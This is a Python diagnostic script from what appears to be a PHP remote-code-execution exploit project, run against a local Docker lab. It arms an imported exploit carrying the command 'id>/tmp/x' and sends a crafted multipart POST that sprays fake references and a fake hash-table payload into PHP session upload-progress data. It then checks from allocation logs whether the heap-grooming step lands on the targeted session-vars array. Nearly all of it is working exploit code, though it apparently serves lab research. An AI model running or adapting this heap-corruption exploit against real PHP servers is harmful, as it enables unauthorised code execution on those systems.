#!/usr/bin/env python3
"""diag_align.py — in ONE run on stock: does any _live_ref(32B) land exactly on PS(http_session_vars)'s
array, and where does the fake-HT carrier actually land vs htdata? Precise stage-3 alignment check."""
import argparse, subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402

CHUNK = 0x7ffffe000000
ap = argparse.ArgumentParser()
ap.add_argument("--url", default="http://localhost:18110/index.php")
ap.add_argument("--container", default="p2s")
a = ap.parse_args()
t = alv.Target(a.url, timeout=200)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

def clear_log():
    subprocess.run(["docker", "exec", a.container, "sh", "-c", ": > /tmp/alloc_all.log"])
def read_log():
    return subprocess.run(["docker", "exec", a.container, "cat", "/tmp/alloc_all.log"], capture_output=True).stdout.decode("latin1").splitlines()

# Phase 1: arming -> get final PS(http_session_vars) ref
clear_log(); time.sleep(0.3)
ex.rotate(); ex._oom_arm_pads()
time.sleep(0.8)
p1 = read_log()
hs_ref = None
for l in p1:
    if l.startswith("PS http_session_vars") and "ref=0x" in l:
        hs_ref = int(l.split("ref=")[1].strip(), 16)
print(f"[{a.container}] PS(http_session_vars) array ref after arming = {hex(hs_ref) if hs_ref else None} (off={hex(hs_ref-CHUNK) if hs_ref else '?'})")

# Phase 2: exploit request -> where do 32B (_live_ref) and the fake-HT carrier land?
clear_log(); time.sleep(0.3)
ht = ex._fake_ht(0x7e0d8); live = ex._live_ref(0x7e0d8)
parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=40)
time.sleep(0.8)
p2 = read_log()

live_offs = []; carrier_off = None
for l in p2:
    p = l.split()
    if len(p) < 3 or p[0] not in ("M", "R"): continue
    try: size, addr = int(p[1]), (int(p[2], 16) if p[0]=="M" else int(p[3], 16))
    except ValueError: continue
    off = addr - CHUNK
    if not (0 <= off < (1 << 21)): continue
    if size == 32: live_offs.append(off)
    if size in (192,): carrier_off = off   # fake-HT value string

live_offs.sort()
print(f"_live_ref(32B) count={len(live_offs)}  range=[0x{min(live_offs):x},0x{max(live_offs):x}]")
if hs_ref:
    target = hs_ref - CHUNK
    near = [o for o in live_offs if abs(o - target) <= 64]
    exact = target in live_offs
    print(f"PS(http_session_vars) off=0x{target:x}: EXACT _live_ref hit={exact}; within +-64B: {len(near)} {[hex(x) for x in near[:8]]}")
print(f"fake-HT carrier(192B) landed at off={hex(carrier_off) if carrier_off is not None else 'NOT FOUND'} (htdata target 0x7e0d8)")
